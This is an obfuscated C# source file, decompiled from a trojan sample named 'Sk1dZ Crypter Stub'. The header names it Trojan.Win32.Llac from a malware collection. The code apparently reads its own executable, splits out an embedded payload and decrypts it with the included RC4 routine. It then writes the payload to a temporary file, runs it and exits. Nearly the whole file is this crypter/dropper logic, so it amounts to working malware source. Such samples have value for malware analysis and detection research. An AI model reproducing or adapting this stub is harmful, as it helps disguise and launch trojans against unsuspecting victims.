// Decompiled with JetBrains decompiler
// Type: Sk1dZ__Crypter_Stub.Form1
// Assembly: Sk1dZ™ Crypter Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 765DE0A6-3ADE-4E57-B9F8-38E417A60863
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Llac.corb-c03a55dcfef9171c3c7a521e3f6aa3cd6873dbf8e0e0c6041a02f9ac6f9bd531.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Sk1dZ__Crypter_Stub.My;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Security;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Ⴈ;

namespace Sk1dZ__Crypter_Stub
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private static List<WeakReference> Ⴗ;
    private Ⴈ.Ⴗ.Ⴜ Ⴀ;

    [SecuritySafeCritical]
    static Form1()
    {
      Ⴓ.ႣႼ();
      Form1.Ⴗ = new List<WeakReference>();
    }

    public Form1()
    {
      Ⴈ.Ⴈ.Ⴀ((Form) this, new EventHandler(this.Ⴅ), 449, 413);
      Form1.Ⴈ((object) this);
      this.Ⴅ();
    }

    private static void Ⴈ(object Ⴗ)
    {
      List<WeakReference> ⴗ = Form1.Ⴗ;
      bool flag1 = false;
      try
      {
        int num1 = 5;
        bool flag2;
        int index1;
        int num2;
        int index2;
        while (true)
        {
          switch (num1)
          {
            case 0:
              Form1.Ⴗ[index1] = Form1.Ⴗ[index2];
              num1 = 6;
              continue;
            case 1:
              Form1.Ⴗ.RemoveRange(index1, checked (Form1.Ⴗ.Count - index1));
              Form1.Ⴗ.Capacity = Form1.Ⴗ.Count;
              num1 = 8;
              continue;
            case 2:
              flag2 = Ⴓ.Ⴍ.Ⴍ(Form1.Ⴗ[index2], 211, 231);
              num1 = 3;
              continue;
            case 3:
              num1 = !flag2 ? 15 : 14;
              continue;
            case 6:
              checked { ++index1; }
              num1 = 15;
              continue;
            case 7:
            case 11:
              num1 = !flag2 ? 8 : 9;
              continue;
            case 8:
              Form1.Ⴗ.Add(new WeakReference(Ⴈ.Ⴗ.Ⴄ(Ⴗ, 172, 247)));
              num1 = 12;
              continue;
            case 9:
              index1 = 0;
              num2 = checked (Form1.Ⴗ.Count - 1);
              index2 = 0;
              num1 = 16;
              continue;
            case 12:
              goto label_22;
            case 13:
            case 15:
              checked { ++index2; }
              num1 = 16;
              continue;
            case 14:
              num1 = index2 == index1 ? 6 : 0;
              continue;
            case 16:
              num1 = index2 <= num2 ? 2 : 1;
              continue;
            default:
              Ⴈ.Ⴗ.Ⴍ((object) ⴗ, ref flag1, 148, 136);
              flag2 = Form1.Ⴗ.Count == Form1.Ⴗ.Capacity;
              num1 = 11;
              continue;
          }
        }
      }
      finally
      {
        int num = 5;
        while (true)
        {
          switch (num)
          {
            case 0:
            case 2:
              goto label_21;
            case 1:
              Monitor.Exit((object) ⴗ);
              goto case 4;
            case 4:
              num = 2;
              continue;
            default:
              num = !flag1 ? 2 : 1;
              continue;
          }
        }
label_21:;
      }
label_22:
      switch (3)
      {
      }
    }

    protected override void Dispose(bool disposing)
    {
      try
      {
        int num1 = 1;
        while (true)
        {
          int num2;
          switch (num1)
          {
            case 0:
            case 4:
              num1 = this.Ⴀ.Ⴄ != null ? 6 : 5;
              continue;
            case 2:
            case 6:
              num2 = 1;
              break;
            case 3:
              this.Ⴀ.Ⴄ.Dispose();
              goto case 7;
            case 5:
              num2 = 0;
              break;
            case 7:
              num1 = 8;
              continue;
            case 8:
              goto label_9;
            default:
              num1 = !disposing ? 5 : 4;
              continue;
          }
          num1 = num2 == 0 ? 8 : 3;
        }
label_9:;
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    private void Ⴅ()
    {
      int num = 7;
      while (true)
      {
        switch (num)
        {
          case 0:
            Ⴈ.Ⴈ.Ⴈ((ContainerControl) this, AutoScaleMode.Font, 171, 185);
            Ⴈ.Ⴗ.ႤႳ((Form) this, new Size(116, 0), 840, 855);
            num = 1;
            continue;
          case 1:
          case 5:
            MyComputer.Ⴅ((Control) this, Ⴓ.Ⴜ(1257221646, 4), 439, 490);
            goto case 2;
          case 2:
          case 6:
            num = 3;
            continue;
          case 3:
            this.Text = Ⴓ.Ⴜ(1257221641, 3);
            this.ResumeLayout(false);
            num = 4;
            continue;
          case 4:
            goto label_7;
          default:
            Ⴓ.Ⴍ.Ⴅ((Control) this, 112, 96);
            Ⴓ.Ⴍ.Ⴓ((ContainerControl) this, new SizeF(6f, 13f), 627, 569);
            num = 0;
            continue;
        }
      }
label_7:;
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private void Ⴅ(object Ⴃ, EventArgs Ⴓ)
    {
label_0:
      int num1;
      int num2;
      try
      {
        int num3 = 7;
label_1:
        int num4;
        while (true)
        {
          string str1;
          string str2;
          string[] strArray;
          string str3;
          int num5;
          int num6;
          switch (num3)
          {
            case 0:
              num5 = num1;
              goto label_38;
            case 1:
            case 8:
              goto label_49;
            case 2:
              num4 = 6;
              MyComputer.Ⴃ(new int[1]{ 1 }, 331, 339);
              num3 = 10;
              continue;
            case 3:
              num4 = 13;
              Ⴈ.Ⴗ.ႤႰ((Form) this, 1023, 1018);
              ProjectData.EndApp();
              num3 = 1;
              continue;
            case 4:
              num4 = 9;
              Ⴓ.Ⴍ.Ⴀ(5, Ⴈ.Ⴗ.ႤႠ(str1, Ⴓ.Ⴜ(1257221684, 8), 97, 116), OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default, -1, 487, 456);
              num3 = 19;
              continue;
            case 5:
              num4 = 8;
              str3 = Form1.rc4(strArray[1], Ⴓ.Ⴜ(1257221675, 4));
              num3 = 4;
              continue;
            case 6:
            case 9:
            case 23:
              goto label_46;
            case 10:
              num4 = 7;
              strArray = Ⴓ.Ⴍ.Ⴗ(str2, Ⴓ.Ⴜ(1257221634, 0), -1, CompareMethod.Binary, 795, 845);
              num3 = 5;
              continue;
            case 11:
              num6 = num2;
              break;
            case 12:
              num4 = 5;
              Ⴓ.ႭႤ(1, ref str2, -1L, false, 283, 280);
              num3 = 2;
              continue;
            case 13:
              num4 = 2;
              str1 = Ⴈ.Ⴗ.ႤႤ(353, 327);
              num3 = 17;
              continue;
            case 14:
              num1 = -2;
              num3 = 13;
              continue;
            case 15:
              num4 = 11;
              MyComputer.Ⴃ(new int[1]{ 5 }, 734, 710);
              num3 = 22;
              continue;
            case 16:
              num6 = num2 + 1;
              break;
            case 17:
              num4 = 3;
              Ⴓ.Ⴍ.Ⴀ(1, Ⴈ.Ⴗ.ႤႤ(666, 701), OpenMode.Binary, OpenAccess.Read, OpenShare.Shared, -1, 240, 223);
              num3 = 18;
              continue;
            case 18:
              num4 = 4;
              str2 = Ⴈ.Ⴈ.Ⴄ(checked ((int) Ⴈ.Ⴗ.ႤႷ(1, 347, 372)), 506, 402);
              num3 = 12;
              continue;
            case 19:
              num4 = 10;
              Ⴈ.Ⴗ.ႤႨ(5, str3, -1L, false, 895, 865);
              num3 = 15;
              continue;
            case 20:
              num5 = 1;
              goto label_38;
            case 21:
              goto label_35;
            case 22:
              num4 = 12;
              Ⴈ.Ⴈ.Ⴅ(Ⴈ.Ⴗ.ႤႠ(str1, Ⴓ.Ⴜ(1257221693, 1), 344, 333), 457, 440);
              num3 = 3;
              continue;
            default:
              Ⴓ.Ⴍ.Ⴃ(34, 119);
              goto case 14;
          }
          num2 = 0;
          int num7;
          switch (num6)
          {
            case 0:
              num7 = 23;
              break;
            case 1:
              goto label_0;
            case 2:
              num7 = 13;
              break;
            case 3:
              num7 = 17;
              break;
            case 4:
              num7 = 18;
              break;
            case 5:
              num7 = 12;
              break;
            case 6:
              num7 = 2;
              break;
            case 7:
              num7 = 10;
              break;
            case 8:
              num7 = 5;
              break;
            case 9:
              num7 = 4;
              break;
            case 10:
              num7 = 19;
              break;
            case 11:
              num7 = 15;
              break;
            case 12:
              num7 = 22;
              break;
            case 13:
              num7 = 3;
              break;
            case 14:
              num7 = 1;
              break;
            default:
              num7 = 23;
              break;
          }
          num3 = num7;
          continue;
label_38:
          int num8;
          switch (num5)
          {
            case 0:
              num8 = 9;
              break;
            case 1:
              num8 = 16;
              break;
            default:
              num8 = 9;
              break;
          }
          num3 = num8;
        }
label_35:
        num2 = num4;
        num3 = num1 > -2 ? 0 : 20;
        goto label_1;
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_35;
      }
label_46:
      int num9 = 1;
label_47:
      switch (num9)
      {
        case 0:
        case 4:
          break;
        case 2:
        case 3:
        case 5:
          ProjectData.ClearProjectError();
          return;
        case 6:
          return;
        default:
          throw ProjectData.CreateProjectError(-2146828237);
      }
label_49:
      num9 = num2 == 0 ? 6 : 5;
      goto label_47;
    }

    public static string rc4(string message, string password)
    {
label_3:
      int index1 = 0;
      int index2 = 0;
      StringBuilder stringBuilder = new StringBuilder();
      string empty = string.Empty;
      int[] numArray1 = new int[257];
      int num1 = 6;
      int[] numArray2;
      int num2;
      int location;
      char ch1;
      int index3;
      int index4;
      int num3;
      int num4;
      int num5;
      char ch2;
      int CharCode;
      while (true)
      {
        switch (num1)
        {
          case 0:
            numArray1[index2] = num4;
            num5 = numArray1[checked (numArray1[index1] + numArray1[index2]) % 256];
            num1 = 1;
            continue;
          case 1:
          case 20:
            ch2 = MyComputer.Ⴐ(MyComputer.Ⴓ(message, checked (location - 1), 1, 765, 720), 495, 474)[0];
            num1 = 14;
            continue;
          case 2:
            location = 1;
            num1 = 3;
            continue;
          case 3:
            num1 = location <= message.Length ? 7 : 21;
            continue;
          case 4:
            goto label_3;
          case 5:
          case 22:
            ch1 = MyComputer.Ⴐ(MyComputer.Ⴓ(password, location % num2, 1, 74, 103), 912, 933)[0];
            num1 = 9;
            continue;
          case 6:
            numArray2 = new int[257];
            num2 = Ⴈ.Ⴈ.Ⴗ(password, 656, 749);
            location = 0;
            num1 = 13;
            continue;
          case 7:
            num4 = 0;
            index1 = checked (index1 + 1) % 256;
            index2 = checked (index2 + numArray1[index1]) % 256;
            num1 = 10;
            continue;
          case 8:
            num3 = numArray1[index4];
            numArray1[index4] = numArray1[index3];
            num1 = 16;
            continue;
          case 9:
            numArray2[location] = MyComputer.Ⴀ(ch1, 553, 613);
            numArray1[location] = location;
            num1 = 19;
            continue;
          case 10:
            num4 = numArray1[index1];
            numArray1[index1] = numArray1[index2];
            num1 = 0;
            continue;
          case 12:
            num1 = 3;
            continue;
          case 13:
            num1 = location <= (int) byte.MaxValue ? 22 : 17;
            continue;
          case 14:
            num4 = MyComputer.Ⴀ(ch2, 627, 575);
            CharCode = num4 ^ num5;
            num1 = 18;
            continue;
          case 15:
            num1 = index4 <= (int) byte.MaxValue ? 23 : 2;
            continue;
          case 16:
            numArray1[index3] = num3;
            Ⴓ.ႭႠ(Ⴓ.ႭႷ(ref index4, 475, 504), checked (index4 - 1), 896, 970);
            num1 = 15;
            continue;
          case 17:
            index3 = 0;
            index4 = 0;
            num1 = 15;
            continue;
          case 18:
            stringBuilder.Append(Strings.Chr(CharCode));
            Math.Max(Interlocked.Increment(ref location), checked (location - 1));
            goto case 12;
          case 19:
            Ⴓ.ႭႠ(Ⴓ.ႭႷ(ref location, 883, 848), checked (location - 1), 634, 560);
            num1 = 13;
            continue;
          case 21:
            goto label_23;
          case 23:
            index3 = checked (index3 + numArray1[index4] + numArray2[index4]) % 256;
            num1 = 8;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Form1.rc4);
            num1 = 4;
            continue;
        }
      }
label_23:
      string str = stringBuilder.ToString();
      stringBuilder.Length = 0;
      return str;
    }
  }
}
